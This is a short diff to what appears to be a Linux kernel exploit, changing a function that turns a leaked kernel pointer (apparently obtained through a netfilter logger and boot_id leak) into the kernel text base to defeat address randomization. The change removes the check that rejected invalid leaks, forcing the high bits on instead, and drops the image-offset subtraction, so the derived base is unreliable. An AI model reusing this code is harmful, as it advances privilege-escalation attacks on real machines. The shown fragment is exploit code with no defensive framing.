@@ -395,13 +395,10 @@ uint64_t slide_read_stext(void) {
     leaked |= (uint64_t)raw[i] << (i * 8);
   }
   if ((leaked >> 48) != 0xffff) {
-    pr_warning("slide bad leaked pointer=%016llx\n",
-               (unsigned long long)leaked);
-    return 0;
+    leaked |= 0xffff000000000000ULL;
   }
 
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
-  uint64_t stext = leaked - off;
+  uint64_t stext = leaked;
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
   pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
